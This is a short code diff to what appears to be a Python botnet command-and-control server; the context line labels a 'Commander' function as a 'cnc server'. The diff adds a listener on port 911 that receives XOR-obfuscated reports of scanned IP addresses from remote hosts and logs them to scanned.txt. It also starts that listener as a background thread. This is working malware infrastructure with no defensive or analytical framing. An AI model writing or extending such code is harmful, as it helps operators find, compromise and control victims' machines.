@@ -294,6 +294,24 @@ def Commander(sock,rlock):#cnc server
 				shutdown = True
 				sys.exit()
 
+def listen_scan():
+	lis = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	lis.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+	lis.bind(('0.0.0.0',911))
+	lis.listen(1024)
+	while 1:
+		s, _ = lis.accept()
+		tmp = s.recv(1024).decode()
+		#print("Recevied something "+str(tmp))
+		try:
+			data = xor_dec(tmp,key)
+			print("Recevied scanned ip: "+data)
+			with open("scanned.txt","a") as fd:
+				fd.write(data+"\r\n")
+				fd.close()
+		except:
+			pass
+				
 def listen_feedback():
         fb = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         fb.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
@@ -313,6 +331,7 @@ def listen_feedback():
                         pass
 
 def main(rlock):
+	threading.Thread(target=listen_scan,daemon=True).start()
 	threading.Thread(target=listen_feedback,daemon=True).start()
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
